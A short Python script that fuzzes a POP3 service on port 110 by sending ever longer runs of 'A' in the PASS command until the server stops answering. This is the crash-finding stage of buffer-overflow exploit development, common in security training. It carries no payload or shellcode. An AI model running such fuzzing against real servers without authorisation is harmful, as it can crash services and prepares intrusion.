#!/usr/bin/python3

import socket
import sys

TARGET = "xxxxxxxx"
PORT = 110

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s.settimeout(3)
        s.connect((TARGET, PORT))
        s.recv(1024)
        s.send(('USER test\r\n').encode())
        s.recv(1024)
        s.send(('PASS ' + buffer + '\r\n').encode())
        s.recv(1024)
        s.send(('QUIT\r\n').encode())
        s.close()
        buffer = buffer + "A" * 100
        print(len(buffer))
    except Exception as e:
        print(e)
        print(f"Fuzzing crashed at: {len(buffer)}")
        sys.exit()
